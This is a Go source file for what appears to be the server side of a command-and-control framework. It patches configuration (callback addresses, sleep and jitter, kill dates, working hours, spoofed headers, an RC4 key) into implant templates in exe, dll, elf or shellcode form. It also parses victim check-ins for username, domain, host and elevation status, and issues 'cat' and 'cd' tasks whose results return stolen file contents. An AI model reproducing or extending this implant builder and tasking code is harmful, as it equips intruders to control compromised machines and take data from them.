package beacon

import (
	"OneServer/utils/request"
	"OneServer/utils/response"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
)

type BeaconGenerateConfig struct {
	// 来自 GenerateConfig
	Os            string `json:"os"`
	Arch          string `json:"arch"`
	Format        string `json:"format"`
	Sleep         int    `json:"sleep"`
	Jitter        int    `json:"jitter"`
	SvcName       string `json:"svcname"`
	IsKillDate    bool   `json:"is_killdate"`
	Killdate      string `json:"kill_date"`
	Killtime      string `json:"kill_time"`
	IsWorkingTime bool   `json:"is_workingtime"`
	StartTime     string `json:"start_time"`
	EndTime       string `json:"end_time"`

	// 来自 ConfigDetail（去掉 SSLCertPath 、 SSLKeyPath、PageError）
	HostBind          string            `json:"host_bind"`
	PortBind          int               `json:"port_bind"`
	CallbackAddresses []string          `json:"callback_addresses"`
	SSL               bool              `json:"ssl"`
	SSLCert           []byte            `json:"ssl_cert,omitempty"`
	SSLKey            []byte            `json:"ssl_key,omitempty"`
	URI               string            `json:"uri"`
	HBHeader          string            `json:"hb_header"`
	HBPrefix          string            `json:"hb_prefix"`
	UserAgent         string            `json:"user_agent"`
	HostHeader        string            `json:"host_header"`
	RequestHeaders    map[string]string `json:"request_headers,omitempty"`
	ResponseHeaders   map[string]string `json:"response_headers,omitempty"`
	XForwardedFor     bool              `json:"x_forwarded_for"`
	PageError         string            `json:"page_error"`
	PagePayload       string            `json:"page_payload"`
	ServerHeaders     map[string]string `json:"server_headers,omitempty"`
	Protocol          string            `json:"protocol"`
	EncryptKey        []byte            `json:"encrypt_key,omitempty"`
}

func (b *BeaconHandler) BeaconGenerateProfile(generateConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]byte, error) {
	merged := BeaconGenerateConfig{
		// 从 generateConfig 复制
		Os:            generateConfig.Os,
		Arch:          generateConfig.Arch,
		Format:        generateConfig.Format,
		Sleep:         generateConfig.Sleep,
		Jitter:        generateConfig.Jitter,
		SvcName:       generateConfig.SvcName,
		IsKillDate:    generateConfig.IsKillDate,
		Killdate:      generateConfig.Killdate,
		Killtime:      generateConfig.Killtime,
		IsWorkingTime: generateConfig.IsWorkingTime,
		StartTime:     generateConfig.StartTime,
		EndTime:       generateConfig.EndTime,

		// 从 listenerConfig 复制
		HostBind:          listenerConfig.HostBind,
		PortBind:          listenerConfig.PortBind,
		CallbackAddresses: listenerConfig.CallbackAddresses,
		SSL:               listenerConfig.SSL,
		SSLCert:           listenerConfig.SSLCert,
		SSLKey:            listenerConfig.SSLKey,
		URI:               listenerConfig.URI,
		HBHeader:          listenerConfig.HBHeader,
		HBPrefix:          listenerConfig.HBPrefix,

		UserAgent:       listenerConfig.UserAgent,
		HostHeader:      listenerConfig.HostHeader,
		RequestHeaders:  listenerConfig.RequestHeaders,
		ResponseHeaders: listenerConfig.ResponseHeaders,
		XForwardedFor:   listenerConfig.XForwardedFor,
		PageError:       listenerConfig.PageError,
		PagePayload:     listenerConfig.PagePayload,
		ServerHeaders:   listenerConfig.ServerHeaders,
		Protocol:        listenerConfig.Protocol,
		EncryptKey:      []byte(listenerConfig.EncryptKey),
	}

	// 生成紧凑 JSON（无缩进）
	return json.Marshal(merged)
}

func (b *BeaconHandler) BeaconBuild(profile []byte, beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]byte, string, error) {

	var (
		dir      string
		filename string
	)

	protocol := listenerConfig.Protocol
	switch protocol {
	case "http":
		dir = "static/http"
	default:
		return nil, "", errors.New("protocol unknown")
	}

	arch := beaconConfig.Arch
	switch arch {
	case "x86":
		dir += "/x86"
		filename = "stage86"
	case "x64":
		dir += "/x64"
		filename = "stage64"
	default:
		return nil, "", errors.New("arch unknown")
	}

	format := beaconConfig.Format
	switch format {
	case "exe":
		filename += ".exe"
	case "dll":
		filename += ".dll"
	case "elf":
		filename += ".elf"
	case "shellcode":
		filename += ".bin"
	default:
		return nil, "", errors.New("format unknown")
	}

	template, err := os.ReadFile(filepath.Join(dir, filename))
	if err != nil {
		return nil, "", err
	}

	marker := []byte("CONFIG_MARKER_2024")
	idx := bytes.Index(template, marker)
	if idx == -1 {
		return nil, "", errors.New("marker not found")
	}

	// 确保不会溢出
	profileSize := len(profile)
	if profileSize > len(template)-(idx+4) {
		return nil, "", errors.New("profile too large")
	}

	// 写入JSON数据长度
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(profileSize))
	copy(template[idx:], sizeBytes)

	// 写入JSON数据
	start := idx + 4
	copy(template[start:], profile)
	err = os.WriteFile("static/product/"+filename, template, 0644)
	if err != nil {
		return nil, "", err
	}

	return template, filename, nil
}

func (b *BeaconHandler) CreateBeacon(initialData []byte) (response.BeaconData, error) {
	var beacon response.BeaconData

	parser := CreateParser(initialData)

	if false == parser.Check([]string{"int32", "int32", "int32", "int32", "int32", "int32", "int32", "int16", "int16", "int32", "byte", "byte", "int32", "byte", "array", "array", "array", "array", "array"}) {
		return beacon, errors.New("error beacon data")
	}

	beacon.Sleep = parser.ParseInt32()
	beacon.Jitter = parser.ParseInt32()
	beacon.KillDate = int(parser.ParseInt32())
	beacon.WorkingTime = int(parser.ParseInt32())
	beacon.ACP = int(parser.ParseInt32())
	beacon.OemCP = int(parser.ParseInt32())
	beacon.GmtOffset = int(parser.ParseInt32())
	beacon.Pid = fmt.Sprintf("%v", parser.ParseInt16())
	beacon.Tid = fmt.Sprintf("%v", parser.ParseInt16())

	buildNumber := parser.ParseInt32()
	majorVersion := parser.ParseInt8()
	minorVersion := parser.ParseInt8()
	internalIp := parser.ParseInt32()
	flag := parser.ParseInt8()

	beacon.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		beacon.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	beacon.Elevated = false
	if (flag & 0b00000100) > 0 {
		beacon.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	beacon.InternalIP = int32ToIPv4(internalIp)
	beacon.Os, beacon.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	beacon.SessionKey = parser.ParseBytes()
	beacon.Domain = string(parser.ParseBytes())
	beacon.Computer = string(parser.ParseBytes())
	beacon.Username = ConvertCpToUTF8(string(parser.ParseBytes()), beacon.ACP)
	beacon.Process = ConvertCpToUTF8(string(parser.ParseBytes()), beacon.ACP)

	return beacon, nil
}

func (b *BeaconHandler) CreateTask(beacon response.BeaconData, command string, args map[string]any) (response.TaskData, error) {

	var (
		taskData response.TaskData
		err      error
	)

	taskData = response.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	var array []interface{}

	switch command {
	case "cat":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{int32(COMMAND_CAT), ConvertUTF8toCp(path, beacon.ACP)}
	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{int32(COMMAND_CD), ConvertUTF8toCp(path, beacon.ACP)}
	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = PackArray(array)
	if err != nil {
		goto RET
	}

RET:
	return taskData, err

}

func (b *BeaconHandler) PackTasks(tasksArray []response.TaskData) ([]byte, error) {

	var (
		packData []byte
		array    []interface{}
		err      error
	)

	for _, taskData := range tasksArray {

		// 把十六进制的任务 ID 转成 int64
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}

		// 一个任务包=任务包的长度（不包含长度字段，4B）+任务ID（4B）+任务数据（任务类型4B+Args）
		array = append(array, int32(4+len(taskData.Data)))
		array = append(array, int32(taskId))
		array = append(array, taskData.Data)
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	return packData, nil
}

func (b *BeaconHandler) EncryptData(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

func (b *BeaconHandler) DecryptData(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

func (b *BeaconHandler) ProcessTasksResult(ts TeamServer, beaconData response.BeaconData, taskData response.TaskData, packedData []byte) error {

	// 创建一个新的packer
	parser := CreateParser(packedData)
	if false == parser.Check([]string{"int32", "int32", "int32"}) {
		return errors.New("data length not match")
	}

	resultData := parser.ParseBytes()
	resultParser := CreateParser(resultData)
	taskId := resultParser.ParseInt32()
	commandId := resultParser.ParseInt32()
	task := taskData
	task.TaskId = fmt.Sprintf("%08x", taskId)
	switch commandId {
	case COMMAND_CAT:

		// 检查结果数据长度
		if false == resultParser.Check([]string{"array", "array"}) {
			return errors.New("result data length not match")
		}

		// 解析文件路径和文件内容
		path := ConvertCpToUTF8(resultParser.ParseString(), beaconData.ACP)
		fileContent := resultParser.ParseBytes()

		// 构造任务消息
		task.Message = fmt.Sprintf("'%v' file content:", path)
		task.ClearText = string(fileContent)
	case COMMAND_CD:

		// 检查是否有足够的数据
		if false == resultParser.Check([]string{"array"}) {
			return errors.New("result data length not match")
		}

		// 解析目录路径
		path := ConvertCpToUTF8(resultParser.ParseString(), beaconData.ACP)

		// 构造任务消息
		task.Message = "Current directory:"
		task.ClearText = path

	case COMMAND_ERROR_REPORT:

		// 检查是否有足够的数据
		if false == resultParser.Check([]string{"array"}) {
			return errors.New("result data length not match")
		}

		// 解析错误信息
		errorMsg := ConvertCpToUTF8(string(resultParser.ParseBytes()), beaconData.ACP)

		// 构造任务消息
		task.Message = "Error report:"
		task.ClearText = errorMsg

	default:
		return errors.New("unknown command")
	}

	fmt.Printf("messageType: %v, message: %v, clearText: %v\n", task.MessageType, task.Message, task.ClearText)

	return nil
}
